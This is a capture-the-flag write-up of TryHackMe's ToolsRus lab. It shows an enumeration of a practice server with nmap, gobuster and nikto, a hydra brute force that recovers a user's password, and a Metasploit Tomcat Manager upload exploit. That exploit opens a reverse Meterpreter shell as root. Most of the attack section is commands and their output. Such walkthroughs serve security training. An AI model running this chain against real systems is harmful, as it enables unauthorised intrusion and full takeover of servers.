# ToolsRus

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
OS: Linux
Subscription type: Premium
Description: Your challenge is to use the tools listed below to enumerate a server, gathering information along the way 
             that will eventually lead to you taking over the machine.

This room will introduce you to the following tools: 
 * Dirbuster
 * Hydra
 * Nmap
 * Nikto
 * Metasploit

If you are stuck at any point, each tool has a respective room or module.
```

Room link: [https://tryhackme.com/r/room/toolsrus](https://tryhackme.com/r/room/toolsrus)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ nmap -v -sV -sC 10.10.236.92              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 10:18 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:18
Completed NSE at 10:18, 0.00s elapsed
Initiating NSE at 10:18
Completed NSE at 10:18, 0.00s elapsed
Initiating NSE at 10:18
Completed NSE at 10:18, 0.00s elapsed
Initiating Ping Scan at 10:18
Scanning 10.10.236.92 [2 ports]
Completed Ping Scan at 10:18, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:18
Completed Parallel DNS resolution of 1 host. at 10:18, 0.00s elapsed
Initiating Connect Scan at 10:18
Scanning 10.10.236.92 [1000 ports]
Discovered open port 22/tcp on 10.10.236.92
Discovered open port 80/tcp on 10.10.236.92
Discovered open port 8009/tcp on 10.10.236.92
Discovered open port 1234/tcp on 10.10.236.92
Completed Connect Scan at 10:18, 0.88s elapsed (1000 total ports)
Initiating Service scan at 10:19
Scanning 4 services on 10.10.236.92
Completed Service scan at 10:19, 9.11s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.236.92.
Initiating NSE at 10:19
Completed NSE at 10:19, 2.68s elapsed
Initiating NSE at 10:19
Completed NSE at 10:19, 0.18s elapsed
Initiating NSE at 10:19
Completed NSE at 10:19, 0.00s elapsed
Nmap scan report for 10.10.236.92
Host is up (0.048s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 85:69:a6:1d:95:35:88:7c:d4:c3:f2:93:eb:b3:2c:ec (RSA)
|   256 31:2c:56:b2:ff:3b:44:95:20:03:23:8d:2c:96:94:4c (ECDSA)
|_  256 c2:70:2f:c4:af:2b:a5:dc:49:10:71:b2:73:c6:b4:9a (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 10:19
Completed NSE at 10:19, 0.00s elapsed
Initiating NSE at 10:19
Completed NSE at 10:19, 0.00s elapsed
Initiating NSE at 10:19
Completed NSE at 10:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
```

We have four services running:

- OpenSSH 7.2p2 on port 22
- Apache httpd 2.4.18 on port 80
- Apache Tomcat on port 1234
- Apache Jserv (Protocol v1.3) on port 8009

### Search for directories and files with gobuster

Next, let's search for directories and files (html, php, and txt) with `gobuster`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php,txt -u http://10.10.236.92
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.236.92
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 168]
/guidelines           (Status: 301) [Size: 317] [--> http://10.10.236.92/guidelines/]
/protected            (Status: 401) [Size: 459]
/.html                (Status: 403) [Size: 292]
Progress: 350656 / 350660 (100.00%)
===============================================================
Finished
===============================================================
```

And there we have the directory that begins with `g`.

Now we check the contents of the directory with `curl`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ curl http://10.10.236.92/guidelines/                                                          
Hey <b>bob</b>, did you update that TomCat server?
```

And there we have the name of the user.

### Bruteforce the password with hydra

We see from the `gobuster` result that the `protected` directory requires authentication due to it's 401 [HTTP status code](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes).

Why not try to bruteforce bob's password with `hydra`?  
We will use the [rockyou.txt wordlist](https://github.com/zacheller/rockyou)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.236.92 http-get /protected
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-16 11:51:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.236.92:80/protected
[80][http-get] host: 10.10.236.92   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-16 11:51:35
```

So bob's password is `bubbles`.

Now we can check the contents of the `protected` directory with `curl`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ curl -u bob:bubbles http://10.10.236.92/protected/  
<center></br>
<img width=150 src="protected.png">
<p>This protected page has now moved to a different port.</p>
</center>
```

### Scan the Tomcat service with Nikto

Let's move on and turn our attention to the Tomcat service running on port `1234`.  
Manually browsing to `http://10.10.236.92:1234/` gives us the version of Apache Tomcat.  
The version of Coyote was already found in the `nmap` version scan.

Next, we scan the Manager App (the `/manager/html` directory) with `nikto`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ nikto -url http://10.10.236.92:1234/manager/html -id bob:bubbles
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.236.92
+ Target Hostname:    10.10.236.92
+ Target Port:        1234
+ Start Time:         2024-09-16 12:19:24 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ /manager/html/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /manager/html/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ All CGI directories 'found', use '-C none' to test none
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /manager/html/cgi.cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/localstart.asp: This might be interesting.
+ /manager/html/manager/manager-howto.html: Tomcat documentation found. See: CWE-552
+ /manager/html/jk-manager/manager-howto.html: Tomcat documentation found. See: CWE-552
+ /manager/html/jk-status/manager-howto.html: Tomcat documentation found. See: CWE-552
+ /manager/html/admin/manager-howto.html: Tomcat documentation found. See: CWE-552
+ /manager/html/host-manager/manager-howto.html: Tomcat documentation found. See: CWE-552
+ /manager/html/manager/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/html/jk-manager/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/html/jk-status/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/html/admin/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/html/host-manager/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/html/manager/status: Default Tomcat Server Status interface found.
+ /manager/html/jk-manager/status: Default Tomcat Server Status interface found.
+ /manager/html/jk-status/status: Default Tomcat Server Status interface found.
+ /manager/html/admin/status: Default Tomcat Server Status interface found.
+ /manager/html/host-manager/status: Default Tomcat Server Status interface found.
+ 26636 requests: 0 error(s) and 91 item(s) reported on remote host
+ End Time:           2024-09-16 12:40:38 (GMT2) (1274 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Exploit the Tomcat service

Of course we want to exploit the Tomcat service and for this we use [Metasploit](https://www.metasploit.com/)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ msfconsole
Metasploit tip: View all productivity tips with the tips command
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search tomcat manager

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  auxiliary/dos/http/apache_commons_fileupload_dos  2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1  exploit/multi/http/tomcat_mgr_deploy              2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   2  exploit/multi/http/tomcat_mgr_upload              2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   3  exploit/multi/http/cisco_dcnm_upload_2019         2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   4  auxiliary/admin/http/ibm_drm_download             2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   5  auxiliary/scanner/http/tomcat_mgr_login                            normal     No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/http/tomcat_mgr_login

msf6 > 
```

We have an authenticated user so let's go for 2 (Apache Tomcat Manager Authenticated Upload Code Execution)

```text
msf6 > use 2
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.111.242.169   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST tun0
LHOST => 10.14.61.233
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.236.92
RHOST => 10.10.236.92
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.14.61.233:4444 
[*] Retrieving session ID and CSRF token...
[*] Finding CSRF token...
[*] Uploading and deploying 4F14dXTtT0XXFnDRS...
[*] Uploading 6123 bytes as 4F14dXTtT0XXFnDRS.war ...
[*] Executing 4F14dXTtT0XXFnDRS...
[*] Executing /4F14dXTtT0XXFnDRS/oRxMGCY3vA2Zl0pbLV8w.jsp...
[-] Execution failed on 4F14dXTtT0XXFnDRS [500 Internal Server Error]
[-] Exploit aborted due to failure: unknown: Failed to execute the payload
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/tomcat_mgr_upload) > 
```

Hhmm, for unknown reasons the exploit failed.

Let's switch target and payload and try again

```text
msf6 exploit(multi/http/tomcat_mgr_upload) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Java Universal
    1   Windows Universal
    2   Linux x86


msf6 exploit(multi/http/tomcat_mgr_upload) > set TARGET 2
TARGET => 2
msf6 exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.14.61.233:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying XAPE3EuO3WxzhZM4LZmqw9g0GTaD...
[*] Executing XAPE3EuO3WxzhZM4LZmqw9g0GTaD...
[*] Sending stage (1017704 bytes) to 10.10.148.39
[*] Undeploying XAPE3EuO3WxzhZM4LZmqw9g0GTaD ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.14.61.233:4444 -> 10.10.148.39:51338) at 2024-09-16 13:30:51 +0200

meterpreter > 
```

Ah, that's better!

Now we can get a shell

```text
meterpreter > sysinfo
Computer     : ip-10-10-148-39.eu-west-1.compute.internal
OS           : Ubuntu 16.04 (Linux 4.4.0-1075-aws)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 1741 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)
```

We are running as root.

### Get the flag

Finally, we locate and cat the flag

```bash
cd /root
ls -la
total 40
drwx------  5 root root 4096 Mar 11  2019 .
drwxr-xr-x 23 root root 4096 Sep 16 10:54 ..
-rw-------  1 root root   47 Mar 11  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Mar 11  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Mar 10  2019 .ssh
-rw-------  1 root root  658 Mar 11  2019 .viminfo
-rw-r--r--  1 root root   33 Mar 11  2019 flag.txt
drwxr-xr-x  3 root root 4096 Mar 10  2019 snap
cat flag.txt
f<REDACTED>1
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [Apache JServ Protocol - Wikipedia](https://en.wikipedia.org/wiki/Apache_JServ_Protocol)
- [Apache Tomcat - Wikipedia](https://en.wikipedia.org/wiki/Apache_Tomcat)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [Gobuster - Github](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [List of HTTP status codes - Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [rockyou.txt wordlist](https://github.com/zacheller/rockyou)
